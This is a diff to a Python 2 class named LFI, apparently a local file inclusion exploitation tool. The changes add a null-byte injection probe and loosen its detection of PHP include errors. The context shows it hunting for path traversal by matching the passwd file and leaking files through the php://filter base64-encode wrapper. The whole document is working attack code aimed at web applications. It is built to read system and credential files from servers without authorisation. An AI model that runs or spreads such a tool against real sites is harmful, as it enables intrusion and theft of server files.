@@ -170,6 +170,23 @@ class LFI ():
                 break
 
             # random string test
+            print '[+] Test random string inclusion with NULL byte'
+            (test_name, query) = self.build_query (fields, idx_test, self.tag_inclusion + '\x00')
+            # build test url
+            url = parsed.scheme + '://' + parsed.netloc + parsed.path + '?' + query
+            print 'Test url : {0}'.format (url)
+            # request test url
+            req = requests.get (url, headers=self.headers, cookies=self.cookies)
+            # check for inclusion result
+            # first with random string
+            if len (re.findall ('include\(', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
+                print 'Is vulnerable with param {0}!'.format (test_name)
+                found_name = test_name
+                found_idx_name = idx_test
+                self.path_suffix = '\x00'
+                break
+
+            # random string test
             print '[+] Test random string inclusion'
             (test_name, query) = self.build_query (fields, idx_test, self.tag_inclusion)
             # build test url
@@ -179,7 +196,7 @@ class LFI ():
             req = requests.get (url, headers=self.headers, cookies=self.cookies)
             # check for inclusion result
             # first with random string
-            if len (re.findall ('function.include', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
+            if len (re.findall ('include\(', req.text)) != 0 and len (re.findall (self.tag_inclusion, req.text)) != 0:
                 print 'Is vulnerable with param {0}!'.format (test_name)
                 found_name = test_name
                 found_idx_name = idx_test
@@ -229,7 +246,7 @@ class LFI ():
             if len (regexp_passwd.findall (req.text)) != 0:
                 self.root_path = traversal
                 return traversal
-        return None
+        return './'
 
     def do_leak (self, filename):
         php_filter = 'php://filter/convert.base64-encode/resource=' + filename
